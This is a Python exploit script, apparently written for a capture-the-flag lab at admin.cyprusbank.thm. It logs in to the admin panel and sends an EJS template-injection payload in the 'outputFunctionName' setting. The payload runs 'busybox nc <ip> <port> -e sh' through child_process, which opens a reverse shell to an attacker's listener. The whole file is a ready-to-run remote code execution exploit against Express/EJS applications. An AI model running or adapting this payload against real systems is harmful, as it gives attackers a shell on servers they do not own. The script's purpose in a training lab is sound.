import requests
import sys
from urllib.parse import *  

url = "http://admin.cyprusbank.thm/login"
exploit_url = "http://admin.cyprusbank.thm/settings"
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

session = requests.Session()
session.proxies = proxies

def login(username, password):
    data = {"username": username, "password": password}
    response = session.post(url, data=data, allow_redirects=False)
    if response.status_code == 302:
        print("[+] Successfully logged in!")
        return True
    else:
        print("[-] Failed to log in.")
        return False

def exploit_lab(ip , port=4443):
    print("[*] EXploit please ensure your nc listener.")
    data = {
        "name": "abc",
        "settings[view options][outputFunctionName]": f"x;process.mainModule.require('child_process').execSync('busybox nc {ip} {port} -e sh');s"
    }
    response = session.post(exploit_url, data=data)

def main():
    if len(sys.argv) != 9:
        print(f"Usage: python3 {sys.argv[0]} -u <username> -p <password> -ip <ip address> -port <port number>")
        sys.exit(-1)

    if sys.argv[1] != "-u" or sys.argv[3] != "-p" or sys.argv[5] != "-ip" or sys.argv[7] != "-port":
        print(f"Usage: python3 {sys.argv[0]} -u <username> -p <password> -ip <ip address> -port <port number>")
        sys.exit(-2)

    username = sys.argv[2]
    password = sys.argv[4]
    ip = sys.argv[6]
    try:
        port = int(sys.argv[8])
    except ValueError:
        print("[-] Invalid port number.")
        sys.exit(-3)

    if login(username, password):
        exploit_lab(ip, port)

if __name__ == "__main__":
    print("[*] Logging in .... ")
    main()